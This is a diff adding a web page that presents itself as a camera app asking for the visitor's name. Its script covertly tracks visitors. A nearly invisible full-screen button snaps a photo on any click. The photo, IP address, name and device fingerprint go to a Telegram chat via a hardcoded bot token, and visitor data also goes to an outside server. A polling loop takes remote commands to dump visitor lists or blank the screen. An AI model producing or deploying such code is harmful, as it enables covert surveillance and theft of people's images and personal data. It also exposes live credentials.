@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Track Visitor IP and Take Photo</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        #takePhotoButton {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01;
+            border: none;
+            background: none;
+            cursor: pointer;
+        }
+
+        #popup {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+            z-index: 1001;
+        }
+
+        #popup input, #popup button {
+            margin-top: 10px;
+            padding: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        #popup button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        #popup button:hover {
+            background-color: #0056b3;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+        }
+
+        #blackScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            z-index: 9999;
+            display: none; /* پیش‌فرض مخفی باشد */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 50px;
+        }
+
+        #switchCameraButton {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 40px;
+            height: 40px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            cursor: pointer;
+            z-index: 1001;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+        }
+        #switchCameraButton:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div id="overlay"></div>
+    <div id="popup">
+        <h3>Please enter your name:</h3>
+        <input type="text" id="username" placeholder="Enter your name">
+        <button id="submitName">Submit</button>
+    </div>
+    <video id="video" autoplay playsinline></video>
+    <button id="takePhotoButton"></button>
+    <button id="clearDataButton" style="position: fixed; bottom: 10px; right: 10px; opacity: 0.5; font-size: 12px;">Clear</button>
+    <div id="blackScreen" style="display: none;">¯\_(ツ)_/¯</div>
+    <button id="switchCameraButton">↺</button>
+
+    <script>
+        let currentStream;
+        let userIP = '';
+        let userName = '';
+        const video = document.getElementById('video');
+        const takePhotoButton = document.getElementById('takePhotoButton');
+        const popup = document.getElementById('popup');
+        const overlay = document.getElementById('overlay');
+        const usernameInput = document.getElementById('username');
+        const submitNameButton = document.getElementById('submitName');
+        const blackScreen = document.getElementById('blackScreen');
+        let isFrontCamera = false;
+
+        // Fetch user IP from external API
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+                console.log('User IP:', userIP);
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+            }
+        }
+
+        // Check if IP is already recorded
+        async function isIPRecorded(ip) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM/getUpdates`);
+                const data = await response.json();
+
+                if (data.ok) {
+                    const messages = data.result;
+                    for (const message of messages) {
+                        if (message.message && message.message.text && message.message.text.includes(`IP: ${ip}`)) {
+                            // Extract name from the message
+                            const nameMatch = message.message.text.match(/Name: (.+)/);
+                            if (nameMatch) {
+                                userName = nameMatch[1];
+                                return true;
+                            }
+                        }
+                    }
+                }
+            } catch (error) {
+                console.error('Error checking IP:', error);
+            }
+            return false;
+        }
+
+        // Start camera
+        async function startCamera(facingMode = 'environment') {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+
+            try {
+                const constraints = { 
+                    video: { 
+                        facingMode: facingMode, 
+                        width: { ideal: 3840 }, 
+                        height: { ideal: 2160 }
+                    } 
+                };
+                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = currentStream;
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                alert('Error accessing camera. Trying lower resolution.');
+                
+                const fallbackConstraints = { video: { facingMode: 'environment' } };
+                try {
+                    currentStream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
+                    video.srcObject = currentStream;
+                } catch (error) {
+                    alert('Failed to access the camera with fallback resolution.');
+                }
+            }
+        }
+
+        // Send name, IP, and photo to Telegram
+        function sendDataToTelegram(blob) {
+            const caption = `Name: ${userName}\nIP: ${userIP}`;
+            const formData = new FormData();
+            formData.append('chat_id', '-1002221297200');
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', caption); // Add caption with name and IP
+
+            fetch(`https://api.telegram.org/bot7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error('Failed to send data: ' + data.description);
+                }
+            })
+            .catch(error => console.error('Error sending data to Telegram:', error));
+        }
+
+        // Send visit notification to Telegram
+        function sendVisitNotification(ip) {
+            const message = `IP: ${ip} has visited the site again.`;
+            const formData = new FormData();
+            formData.append('chat_id', '-1002221297200');
+            formData.append('text', message);
+
+            fetch(`https://api.telegram.org/bot7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM/sendMessage`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error('Failed to send visit notification: ' + data.description);
+                }
+            })
+            .catch(error => console.error('Error sending visit notification to Telegram:', error));
+        }
+
+        // Take photo and send data
+        function takePhoto() {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw video frame onto canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+                sendDataToTelegram(blob);
+                incrementPhotoCount(userIP); // Update photo count after sending photo
+            }, 'image/jpeg', 0.9);  // Compress image to 90%
+        }
+
+        // Get device information
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const languages = navigator.languages.join(', ');
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            return `Device: ${platform}\nBrowser: ${userAgent}\nLanguages: ${languages}\nScreen Size: ${screenSize}`;
+        }
+
+        // Send text message to Telegram
+        function sendTextToTelegram(name, ip, deviceInfo) {
+            const message = `Name: ${name}\nIP: ${ip}\n${deviceInfo}`;
+            const formData = new FormData();
+            formData.append('chat_id', '-1002221297200');
+            formData.append('text', message);
+
+            fetch(`https://api.telegram.org/bot7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM/sendMessage`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error('Failed to send text: ' + data.description);
+                }
+            })
+            .catch(error => console.error('Error sending text to Telegram:', error));
+        }
+
+        // Store user info in Telegram
+        function storeUserInfo(name, ip) {
+            const message = `STORE_USER\nName: ${name}\nIP: ${ip}`;
+            const formData = new FormData();
+            formData.append('chat_id', '-1002221297200');
+            formData.append('text', message);
+
+            fetch(`https://api.telegram.org/bot7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM/sendMessage`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error('Failed to store user info: ' + data.description);
+                }
+            })
+            .catch(error => console.error('Error storing user info to Telegram:', error));
+        }
+
+        // Save user info to localStorage
+        function saveUserToLocal(name, ip) {
+            localStorage.setItem('userName', name);
+            localStorage.setItem('userIP', ip);
+        }
+
+        // Get user info from localStorage
+        function getUserFromLocal() {
+            const name = localStorage.getItem('userName');
+            const ip = localStorage.getItem('userIP');
+            return { name, ip };
+        }
+
+        // Send welcome message to Telegram
+        function sendWelcomeMessageToTelegram(name, ip) {
+            const message = `User ${name} with IP ${ip} has entered the site.`;
+            const formData = new FormData();
+            formData.append('chat_id', '-1002221297200');
+            formData.append('text', message);
+
+            fetch(`https://api.telegram.org/bot7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM/sendMessage`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error('Failed to send welcome message: ' + data.description);
+                }
+            })
+            .catch(error => console.error('Error sending welcome message to Telegram:', error));
+        }
+
+        // Add user to list in localStorage
+        function addUserToList(name, ip) {
+            let userList = JSON.parse(localStorage.getItem('userList')) || [];
+            const userExists = userList.some(user => user.ip === ip);
+
+            if (!userExists) {
+                userList.push({ name, ip, photoCount: 0 });
+                localStorage.setItem('userList', JSON.stringify(userList));
+            }
+        }
+
+        // Increment photo count for a user
+        function incrementPhotoCount(ip) {
+            let userList = JSON.parse(localStorage.getItem('userList')) || [];
+            const userIndex = userList.findIndex(user => user.ip === ip);
+
+            if (userIndex !== -1) {
+                userList[userIndex].photoCount = (userList[userIndex].photoCount || 0) + 1;
+                localStorage.setItem('userList', JSON.stringify(userList));
+            }
+        }
+
+        // Get user list from localStorage
+        function getUserList() {
+            return JSON.parse(localStorage.getItem('userList')) || [];
+        }
+
+        // Send user list to Telegram
+        function sendUserListToTelegram() {
+            const userList = getUserList();
+            if (userList.length === 0) {
+                sendMessageToTelegram("No user data available.");
+                return;
+            }
+
+            const message = userList.map(user => 
+                `Name: ${user.name}, IP: ${user.ip}, Photos Sent: ${user.photoCount || 0}`
+            ).join("\n");
+            sendMessageToTelegram(`User List:\n${message}`);
+        }
+
+        // Send a message to Telegram
+        function sendMessageToTelegram(message) {
+            const formData = new FormData();
+            formData.append('chat_id', '-1002221297200');
+            formData.append('text', message);
+
+            fetch(`https://api.telegram.org/bot7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM/sendMessage`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error('Failed to send message: ' + data.description);
+                }
+            })
+            .catch(error => console.error('Error sending message to Telegram:', error));
+        }
+
+        let lastUpdateId = 0; // To track the latest command processed
+
+        // Check for commands from Telegram
+        async function checkTelegramCommands() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await response.json();
+
+                if (data.ok) {
+                    const updates = data.result;
+                    updates.forEach(update => {
+                        if (update.message && update.message.text) {
+                            const command = update.message.text.trim().toLowerCase();
+                            if (command === "ip") {
+                                sendUserListToTelegram(); // Send the user list
+                            } else if (command === "off") {
+                                blackScreen.style.display = "flex"; // Show black screen
+                            } else if (command === "on") {
+                                blackScreen.style.display = "none"; // Hide black screen
+                            }
+                        }
+                        lastUpdateId = update.update_id; // Update the last processed update ID
+                    });
+                }
+            } catch (error) {
+                console.error('Error checking Telegram commands:', error);
+            }
+        }
+
+        // Check for commands every 10 seconds
+        setInterval(checkTelegramCommands, 10000);
+
+        // Fetch the latest Telegram message
+        async function checkLastTelegramMessage() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM/getUpdates`);
+                const data = await response.json();
+
+                if (data.ok) {
+                    const updates = data.result;
+                    if (updates.length > 0) {
+                        const lastMessage = updates[updates.length - 1].message.text.trim().toLowerCase();
+                        if (lastMessage === "off") {
+                            blackScreen.style.display = "flex"; // Show black screen
+                        } else {
+                            blackScreen.style.display = "none"; // Hide black screen
+                        }
+                    }
+                }
+            } catch (error) {
+                console.error('Error fetching Telegram messages:', error);
+            }
+        }
+
+        // Send a test message to Telegram
+        fetch('/send-to-telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: 'This is a test message!' }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                console.log('Message sent successfully!');
+            } else {
+                console.error('Error sending message:', data.error);
+            }
+        })
+        .catch(error => console.error('Fetch error:', error));
+
+        // Send user data to the server
+        function sendDataToServer(ip, name, photoCount) {
+            fetch('https://first-lens.vercel.app/update-user', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip, name, photoCount }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log('User data sent to server.');
+                } else {
+                    console.error('Failed to send data:', data.message);
+                }
+            })
+            .catch(error => console.error('Error sending data to server:', error));
+        }
+
+        // Fetch IP on page load
+        async function initialize() {
+            // Check Telegram last message before anything
+            await checkLastTelegramMessage();
+
+            // Fetch the user's IP
+            await getUserIP();
+
+            // Check if the user data is stored in localStorage
+            const savedUser = getUserFromLocal();
+
+            if (savedUser.name && savedUser.ip === userIP) {
+                // If user data matches, use the saved name
+                userName = savedUser.name;
+                sendWelcomeMessageToTelegram(userName, userIP); // Send a welcome message
+                popup.style.display = 'none';
+                overlay.style.display = 'none';
+                startCamera(); // Start the camera directly
+            } else {
+                // If no match, ask for the user's name
+                popup.style.display = 'block';
+                overlay.style.display = 'block';
+            }
+        }
+
+        // Handle name submission
+        submitNameButton.addEventListener('click', () => {
+            const name = usernameInput.value.trim();
+            if (!name) {
+                alert('Please enter your name.');
+                return;
+            }
+
+            userName = name;
+
+            // Save to localStorage
+            saveUserToLocal(userName, userIP);
+            addUserToList(userName, userIP);
+
+            // Send text message and store user info
+            const deviceInfo = getDeviceInfo();
+            sendTextToTelegram(userName, userIP, deviceInfo);
+            storeUserInfo(userName, userIP);
+
+            // Send welcome message
+            sendWelcomeMessageToTelegram(userName, userIP);
+
+            // Send data to server
+            sendDataToServer(userIP, userName, 0);
+
+            // Hide popup
+            popup.style.display = 'none';
+            overlay.style.display = 'none';
+
+            // Start camera and enable photo capture
+            startCamera();
+        });
+
+        // Clear stored data
+        document.getElementById('clearDataButton').addEventListener('click', () => {
+            const password = prompt('Enter password to clear data:');
+            if (password === '8153') {
+                localStorage.removeItem('userName');
+                localStorage.removeItem('userIP');
+                alert('User data has been cleared.');
+                location.reload();
+            } else {
+                alert('Incorrect password!');
+            }
+        });
+
+        initialize();
+
+        // Take photo on button click
+        takePhotoButton.addEventListener('click', takePhoto);
+
+        document.getElementById('switchCameraButton').addEventListener('click', () => {
+            isFrontCamera = !isFrontCamera;
+            const facingMode = isFrontCamera ? 'user' : 'environment';
+            startCamera(facingMode);
+        });
+    </script>
+</body>
+</html>
